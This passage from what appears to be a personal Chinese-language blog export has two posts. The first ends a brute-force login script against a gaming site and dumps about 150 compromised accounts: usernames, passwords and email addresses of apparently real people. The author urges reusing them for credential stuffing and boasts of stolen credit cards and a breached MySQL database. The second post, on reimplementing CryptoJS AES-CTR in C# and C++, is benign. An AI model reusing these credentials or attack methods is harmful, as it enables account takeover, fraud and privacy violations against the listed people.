c.replace(&quot;aa&quot;, &quot;a&quot;)  \n    login_gamer(i, b)\n</code></pre>\n<p>以下是戰利品，簡簡單單的腳本可以造成如此可怕的破壞性。 可以將其拿去撞庫其他網站。</p>\n<pre><code>Username: aa0903465890, Password: a0903465890, Status Code: 200  a0903465890@gmail.com 動漫風\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0952121590, Password: a0952121590, Status Code: 200  bodishenqi@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0909165363, Password: a0909165363, Status Code: 200 a0952148610@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0903892528, Password: a0903892528, Status Code: 200 b0903892528@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: w0906997609, Password: a0906997609, Status Code: 200 datealive24561715@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0907711641, Password: a0907711641, Status Code: 200 a0932602130@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0985883382, Password: a0985883382, Status Code: 200 b0985883382@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0902445622, Password: a0902445622, Status Code: 200 a0902445622@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0968223897, Password: a0968223897, Status Code: 200  a0968223897@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0910525, Password: a0910525, Status Code: 200 aa0928252609@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: e0973943179, Password: a0973943179, Status Code: 200 lovebaby19810802@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0918681748, Password: a0918681748, Status Code: 200 love0918681748@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: st0986808392, Password: a0986808392, Status Code: 200 st882810@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0968954488, Password: a0968954488, Status Code: 200 gg122504531@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0935962575, Password: a0935962575, Status Code: 200 asdw95049@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0953956567, Password: a0953956567, Status Code: 200 a0953956567@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0987890752, Password: a0987890752, Status Code: 200 young30987@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0906566327, Password: a0906566327, Status Code: 200 a0906566327@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: f0916727293, Password: a0916727293, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b09158500, Password: a09158500, Status Code: 200 b0909158500@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: jy0907007336, Password: a0907007336, Status Code: 200 chizhengyou535@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: zx0980821344, Password: a0980821344, Status Code: 200 a0980821344@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: a709980792, Password: a709980792, Status Code: 200 msn709980792@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: l0903019107, Password: a0903019107, Status Code: 200 adwx83@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: gg0910288118, Password: a0910288118, Status Code: 200 louser9487@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: c0905610929, Password: a0905610929, Status Code: 200 a0905610929@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: c0968908771, Password: a0968908771, Status Code: 200 gavin62115@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s097944987, Password: a097944987, Status Code: 200 jason930312@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: je0928511681, Password: a0928511681, Status Code: 200 a0928511681@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0916543726, Password: a0916543726, Status Code: 200 chan92726@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: l0909340420, Password: a0909340420, Status Code: 200 a0909340420@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: os0984028800, Password: a0984028800, Status Code: 200 \nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0977300591, Password: a0977300591, Status Code: 200 a0977300591@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0965107208, Password: a0965107208, Status Code: 200 a0965107208@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0905795377, Password: a0905795377, Status Code: 200 aa0905795377@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0951115, Password: a0951115, Status Code: 200    s0951115@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ji0966109453, Password: a0966109453, Status Code: 200 a0966109453@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0905427665, Password: a0905427665, Status Code: 200 a0905427665@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: p090749499, Password: pp090749499, Status Code: 200  p090749499@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: t0912287071, Password: tt0912287071, Status Code: 200  t091228.t7071@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: j090276, Password: jj090276, Status Code: 200 j090276@my.cmsh.cyc.edu.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: aa0981073215, Password: aa0981073215, Status Code: 200  a0981073215@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: l0990209, Password: l0990209, Status Code: 200  z6865105@gmail.com shipeicen992@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: h10911218, Password: h10911218, Status Code: 200 kencatu@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: m0976722676, Password: m0976722676, Status Code: 200 scorpio2014520@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: j0905911501, Password: j0905911501, Status Code: 200 jeff29218829@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: f0980466920, Password: f0980466920, Status Code: 200 poror81333@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: s0987550111, Password: s0987550111, Status Code: 200 s0987550111@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n以下密碼同帳號\nok0927719082  okok0927719082@gmail.com\nm0965007291 s9007311@gmail.com\nk0966525111  cruoen@gmail.com 2000-08-17 6889\nk0963106226 k0963106226\naa0920686666  Aa0920686666@icloud.com\nb0935429595 b0935429595@gmail.com\nd09231202 willy5931@gmail.com\nw0965572698\nk0970283000 kaononog@gmail.com\nvi0909211939 erli90889@gmail.com\njs0975546884 js0975546884@gmail.com\ns0970572524 w674961@gmail.com 這個\nq0903571195 jay136001@gmail.com\naa0909503439 50014@thjh.tc.edu.tw\nq0905394257 q0905394257@gmail.com\nw0906181410\nav0907325862 0963521qq@gmail.com  有\nUsername: aa09210035, Password: a09210035, Status Code: 200  a09210822@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: u0979254001, Password: a0979254001, Status Code: 200 unicorn0979254001@icloud.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0912633373, Password: a0912633373, Status Code: 200 aa0912633373@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0911805750, Password: a0911805750, Status Code: 200 a0911805750@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0966176188, Password: a0966176188, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0905292491, Password: a0905292491, Status Code: 200 abc092053@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0938918616, Password: a0938918616, Status Code: 200 a0938918616@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0960960809, Password: a0960960809, Status Code: 200 love088613559@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0920194989, Password: a0920194989, Status Code: 200 a0920194989@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0909591313, Password: a0909591313, Status Code: 200 cmy0909591313@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: r0972880749, Password: a0972880749, Status Code: 200 r0972880749@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0976681217, Password: a0976681217, Status Code: 200 a0976681217@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0960300399, Password: a0960300399, Status Code: 200 a0960300399@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0903060747, Password: a0903060747, Status Code: 200 a0903060747@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0903559094, Password: a0903559094, Status Code: 200 a090355909432@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: k0933944907, Password: a0933944907, Status Code: 200 annime284@icloud.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0905879083, Password: a0905879083, Status Code: 200 a0905879083@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: pe0988977410, Password: a0988977410, Status Code: 200 a0988977410@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0908279601, Password: a0908279601, Status Code: 200 csc908279601@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: m0905660182, Password: a0905660182, Status Code: 200 a0905660182@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0908550262, Password: a0908550262, Status Code: 200 a0908550262@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0966120010, Password: a0966120010, Status Code: 200 q0966120010@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0965332258, Password: a0965332258, Status Code: 200 a0965332258@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: t0909514986, Password: a0909514986, Status Code: 200 a0909514986@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0908365535, Password: a0908365535, Status Code: 200 b0908365535@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0980458882, Password: a0980458882, Status Code: 200 a871888@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: p0965494790, Password: a0965494790, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: yx0974043504, Password: a0974043504, Status Code: 200 a0974043504@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0979042990, Password: a0979042990, Status Code: 200 jess518313@yahoo.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0963566296, Password: a0963566296, Status Code: 200 a0963566296@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0928452731, Password: a0928452731, Status Code: 200 a0928452731@gmail.com st2630322@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0975285779, Password: a0975285779, Status Code: 200 a0975297472@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0911202824, Password: a0911202824, Status Code: 200 \nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0989569855, Password: a0989569855, Status Code: 200 -acps91152@gmail.com  -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0912660626, Password: a0912660626, Status Code: 200 -a060943@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0909070825, Password: a0909070825, Status Code: 200 a0909070825@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0936780533, Password: a0936780533, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0979580968, Password: a0979580968, Status Code: 200 b0979580968@gmail.com  -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0902101002, Password: a0902101002, Status Code: 200 aa0902101002@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0985430586, Password: a0985430586, Status Code: 200 a0985430586@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0906730857, Password: a0906730857, Status Code: 200 \nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0963756676, Password: a0963756676, Status Code: 200 a0963756676@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0981388805, Password: a0981388805, Status Code: 200 weileyhu0813@yahoo.com.tw -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: w0908450298, Password: a0908450298, Status Code: 200 rex930504@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: r0980018123, Password: a0980018123, Status Code: 200   -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: sa0981232712, Password: a0981232712, Status Code: 200 sa0981232712@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0903738680, Password: a0903738680-, Status Code: 200 a0903738680@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0973886245, Password: a0973886245, Status Code: 200 s0973886245@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0900413183, Password: a0900413183, Status Code: 200 dog970dog@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0921781869, Password: a0921781869, Status Code: 200 sxiao6071@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0970788600, Password: a0970788600, Status Code: 200 aaa0970788600@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0903828673, Password: a0903828673, Status Code: 200 C107113210@nkust.edu.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: t0972811154, Password: a0972811154, Status Code: 200 t0972811154@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0986199269, Password: a0986199269, Status Code: 200 doublew0423@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0970566527, Password: a0970566527, Status Code: 200 hunhun168168268@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0988257795, Password: a0988257795, Status Code: 200 a0988257795@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0939282769, Password: a0939282769, Status Code: 200 axz123123@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0952070619, Password: a0952070619, Status Code: 200 a0952070619@gmail.com   -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0970763930, Password: a0970763930, Status Code: 200 a0970763930@icloud.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0905180925, Password: a0905180925, Status Code: 200 a0905180925@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: c0906522264, Password: a0906522264, Status Code: 200 a0906522264@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0932729141, Password: a0932729141, Status Code: 200 a0932729141@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0920212123, Password: a0920212123, Status Code: 200 sp40384579@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0925093877, Password: a0925093877, Status Code: 200 a0925093877@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: lj0965137654, Password: a0965137654, Status Code: 200 melody19991018@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: bo0906364202, Password: a0906364202, Status Code: 200 continue88@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0979767832, Password: a0979767832, Status Code: 200 a080888888@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0979619251, Password: a0979619251, Status Code: 200 aa0979619251@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0972808320, Password: a0972808320, Status Code: 200 a0972808320@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0986307029, Password: a0986307029, Status Code: 200 as0986307029@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0976744597, Password: a0976744597, Status Code: 200 a0976744597@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0907746473, Password: a0907746473, Status Code: 200 a0907746473@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z09781279, Password: a09781279, Status Code: 200 xx192922@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: j0978099261, Password: a0978099261, Status Code: 200 smile0978099265@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0939015430, Password: a0939015430, Status Code: 200 a0939015430@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0965005858, Password: a0965005858, Status Code: 200 a0965005858@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0905664221, Password: a0905664221, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n</code></pre>\n<p>但是!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p>\n<p>打下帳號頂多獲得facebook，身分證.信用卡等等，我確實拿到了信用卡好幾張2張過期 3張未過期，但是他們共同點，無法使用。</p>\n<p>也沒有勒索功能。純屬自嗨!?</p>\n<p>滲透mysql庫呢，去年我打下了一個mysql庫，他被滲透原因，把mysql庫的密碼，寫在客戶端，被我逆向取出。</p>\n<p>也沒有勒索價值，mysql庫權限十分嚴格，我無法提權到系統root 只有mysql的root。</p>\n<p>或許我應該去打企業或是更高價值的地方。</p>\n"},{"title":"還原cryptojs AES-CTR採坑紀錄","date":"2025-05-29T03:56:33.000Z","_content":"\n\n我原本 以為C++和C#還原cryptojs丟入GPT就能解出算法\n\n    function encrypt(message, secretKey) {\n        var hash = CryptoJS.SHA256(secretKey + 'one-deep');\n        var key = hash.toString(CryptoJS.enc.Base64).substr(0, 32);\n\n        hash = CryptoJS.SHA256(secretKey.substr(0, 16));\n        var ive = hash.toString(CryptoJS.enc.Base64).substr(0, 16);\n\n        var options = { iv: ive, mode: CryptoJS.mode.CTR };\n        var enc = CryptoJS.AES.encrypt(message, key, options);\n        return enc.toString();\n    }\n\n\n後來  我只好去研究cryptojs底層實踐\n<span style=\"color:blue\">#第一坑</span>\nGPT的 回答的AES256_CTR_Encrypt 的加密 \n沒有 node_modules/crypto-js/evpkdf.js中的\n\n    cfg: Base.extend({\n        keySize: 128/32,\n        hasher: MD5,\n        iterations: 1\n    }),\n\n此乃大坑之一也\n\n<span style=\"color:blue\">#第二坑</span>\nGPT常用OpenSSL 3.0之前的舊版本的非EVP  舊函數 導致代碼執行不能\n類似於AES_encrypt()\nMD5_Init() / SHA256_Init() /HMAC()\n我網路上查很多資料都沒有 我草大坑\n\n\n<span style=\"color:blue\">#第三坑</span>\n\nCRYPTOJS 雖然他沒有直說\n但他  有用 PKCS7 填充\n如果未滿足1 Chunk的 數據 會進行填充\n尼瑪的 我原本只加解密大於1 Chunk 但當我加解密{} 空數據\n直接故障報錯\n\n\n\n<span style=\"color:green\">最後附上我的完整代碼</span>\n\n<span style=\"color:red;\">C#版本</span>\n        \n    public class OpenSSL_AES_CTR\n    {\n        public static string GenerateKeyFromSecret(string secretKey)\n        {\n            string salt = \"one-deep\";\n            string combined = secretKey + salt;\n\n            using (SHA256 sha256 = SHA256.Create())\n            {\n                byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(combined));\n                string base64 = Convert.ToBase64String(hash);\n                return base64.Substring(0, 32);\n            }\n        }\n\n        public static byte[] EVP_BytesToKey_MD5(string password, byte[] salt, int keyIvLength)\n        {\n            using (var md5 = MD5.Create())\n            {\n                MemoryStream result = new MemoryStream();\n                byte[] prev = new byte[0];\n\n                while (result.Length < keyIvLength)\n                {\n                    byte[] data = new byte[prev.Length + password.Length + salt.Length];\n                    Buffer.BlockCopy(prev, 0, data, 0, prev.Length);\n                    Buffer.BlockCopy(Encoding.UTF8.GetBytes(password), 0, data, prev.Length, password.Length);\n                    Buffer.BlockCopy(salt, 0, data, prev.Length + password.Length, salt.Length);\n\n                    prev = md5.ComputeHash(data);\n                    result.Write(prev, 0, prev.Length);\n                }\n\n                byte[] buffer = result.ToArray();\n                Array.Resize(ref buffer, keyIvLength);\n                return buffer;\n            }\n        }\n\n        public static byte[] AES256_CTR_Encrypt(byte[] plaintext, byte[] key, byte[] iv)\n        {\n            using (Aes aes = Aes.Create())\n            {\n                aes.Mode = CipherMode.ECB; \n                aes.Padding = PaddingMode.None;\n                aes.Key = key;\n\n                using (var encryptor = aes.CreateEncryptor())\n                {\n                    byte[] ciphertext = new byte[plaintext.Length];\n                    byte[] counter = (byte[])iv.Clone();\n                    byte[] keystreamBlock = new byte[16];\n                    for (int i = 0; i < plaintext.Length; i += 16)\n                    {\n                        keystreamBlock = encryptor.TransformFinalBlock(counter, 0, 16);\n\n                        for (int j = 0; j < 16 && (i + j) < plaintext.Length; ++j)\n                            ciphertext[i + j] = (byte)(plaintext[i + j] ^ keystreamBlock[j]);\n\n                        \n                        for (int j = 15; j >= 0; j--)\n                        {\n                            if (++counter[j] != 0)\n                                break;\n                        }\n                    }\n\n                    return ciphertext;\n                }\n            }\n        }\n\n        public static byte[] AES256_CTR_Decrypt(byte[] ciphertext, byte[] key, byte[] iv)\n        {\n           \n            return AES256_CTR_Encrypt(ciphertext, key, iv);\n        }\n        public static byte[] PKCS7Pad(byte[] data)\n        {\n            int blockSize = 16;\n            int paddingLen = blockSize - (data.Length % blockSize);\n            if (paddingLen == 0) paddingLen = blockSize;\n\n            byte[] padded = new byte[data.Length + paddingLen];\n            Buffer.BlockCopy(data, 0, padded, 0, data.Length);\n            for (int i = data.Length; i < padded.Length; i++)\n                padded[i] = (byte)paddingLen;\n\n            return padded;\n        }\n\n        public static byte[] PKCS7Unpad(byte[] data)\n        {\n            if (data.Length == 0) return data;\n            int paddingLen = data[data.Length - 1];\n            if (paddingLen <= 0 || paddingLen > 16) return data;\n\n            for (int i = data.Length - paddingLen; i < data.Length; i++)\n            {\n                if (data[i] != paddingLen)\n                    return data;  \n            }\n\n            byte[] unpadded = new byte[data.Length - paddingLen];\n            Buffer.BlockCopy(data, 0, unpadded, 0, unpadded.Length);\n            return unpadded;\n        }\n\n        public static string Encrypt(string plaintext, string secretKey)\n        {\n            string password = GenerateKeyFromSecret(secretKey);\n\n            byte[] salt = new byte[8];\n            RandomNumberGenerator.Fill(salt);\n\n            byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n            byte[] key = new byte[32];\n            byte[] iv = new byte[16];\n            Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n            Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n            byte[] pt = Encoding.UTF8.GetBytes(plaintext);\n            pt = PKCS7Pad(pt);\n            byte[] encrypted = AES256_CTR_Encrypt(pt, key, iv);\n\n\n\n            using (MemoryStream ms = new MemoryStream())\n            {\n                byte[] prefix = Encoding.ASCII.GetBytes(\"Salted__\");\n                ms.Write(prefix, 0, prefix.Length);\n                ms.Write(salt, 0, salt.Length);\n                ms.Write(encrypted, 0, encrypted.Length);\n\n                return Convert.ToBase64String(ms.ToArray());\n            }\n        }\n\n        public static string Decrypt(string b64, string secretKey)\n        {\n            byte[] data = Convert.FromBase64String(b64);\n            if (data.Length < 16 || Encoding.ASCII.GetString(data, 0, 8) != \"Salted__\")\n                throw new Exception(\"Invalid format: not salted OpenSSL.\");\n\n            byte[] salt = new byte[8];\n            Array.Copy(data, 8, salt, 0, 8);\n            byte[] ciphertext = new byte[data.Length - 16];\n            Array.Copy(data, 16, ciphertext, 0, ciphertext.Length);\n\n            string password = GenerateKeyFromSecret(secretKey);\n            byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n            byte[] key = new byte[32];\n            byte[] iv = new byte[16];\n            Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n            Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n            byte[] decrypted = AES256_CTR_Decrypt(ciphertext, key, iv);\n            decrypted = PKCS7Unpad(decrypted);\n            return Encoding.UTF8.GetString(decrypted);\n\n        }\n    }\n\n\n\n <span style=\"color:red;\">C++版本</span>\n\n\n    #include <openssl/rand.h>\n    #include <iostream>\n    #include <string>\n    #include <vector>\n    #include <openssl/evp.h>\n    #include <openssl/sha.h>\n    #include <openssl/bio.h>\n    #include <openssl/buffer.h>\n    #include <iomanip>\n    #include <openssl/md5.h>\n    #include <openssl/aes.h>\n    #include <cstring>\n    void calculate_sha256(\n        const std::string& input, \n        unsigned char* output\n    ) {\n        EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n        if (mdctx == nullptr) {\n            std::cerr << \"Error creating EVP_MD_CTX.\" << std::endl;\n            return;\n        }\n\n     \n        if (1 != EVP_DigestInit_ex(mdctx, EVP_sha256(), nullptr)) {\n            std::cerr << \"Error initializing digest.\" << std::endl;\n            EVP_MD_CTX_free(mdctx);\n            return;\n        }\n\n \n        if (1 != EVP_DigestUpdate(mdctx, input.c_str(), input.length())) {\n            std::cerr << \"Error updating digest.\" << std::endl;\n            EVP_MD_CTX_free(mdctx);\n            return;\n        }\n\n        \n        unsigned int len = 